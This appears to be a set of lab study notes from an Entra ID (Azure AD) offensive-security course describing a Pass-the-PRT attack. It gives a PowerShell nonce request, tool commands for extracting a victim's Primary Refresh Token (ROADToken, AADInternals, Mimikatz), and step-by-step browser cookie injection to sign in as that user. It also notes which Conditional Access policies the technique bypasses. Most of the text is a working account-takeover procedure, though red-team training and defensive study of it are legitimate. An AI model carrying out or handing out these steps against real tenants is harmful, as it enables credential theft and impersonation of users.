- if we have access to a PRT, it's possible to request access tokens for any application.
- Chrome uses BrowserCore.exe to use PRT and request PRT cookie for SSO experience. 
- This PRT cookie `x-ms-RefreshTokenCredential` can be used in a browser to access any application as the user whose PRT we have. 

## Extracting PRT
- Entra ID makes use of nonce for request validation. We need to request a nonce to extract PRT:
```powershell
$TenantID = '.....'
$URL = "https://login.microsoftonline.com/$TenantID/oauth2/token"

$Params = @{
	"URI" = $URL
	"Method" = "Post"
}

$Body =@{
	"grant_type" = "srv_challenge"
}

$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
```

- we can extract PRT by using the below tools in a session on the target Entra ID user:
	- RoadToken - `C:\AZAD\Tools\ROADToken.exe <nonce>`
	- AADInternals - `Get-AADIntUserPRTToken`
- we could also use Mimikatz or it's variants to extract the PRT and other secrets (session and clear keys)
- Please note in the lab we are using SessionExecCommand to run ROADToken in context of the user Michael Barron: `https://gitlab.com/KevinJClark/csharptoolbox/-/blob/master/SessionExecCommand.cs`

Once we have the PRT cookie, copy the value from previous command and use it with Chrome web browser:
- Open the Browser in Incognito mode
- Go to `http://login.microsoftonline.com/login.srf`
- Press F12(Developer tools) -> Application -> Cookies
- Clear all cookies and then add one named `x-ms-RefreshTokenCredential` for  `http://login.microsoftonline.com/login.srf` and set its value to that retrieved from AADInternals
- Mark HTTPOnly and Secure for the cookie
- Visit  `http://login.microsoftonline.com/login.srf` again we will get access as the user
- note that a location based Conditional Access Policy would block Pass-thePRT whereas a "require compliant and/or Entra joined device" policy is bypassed. 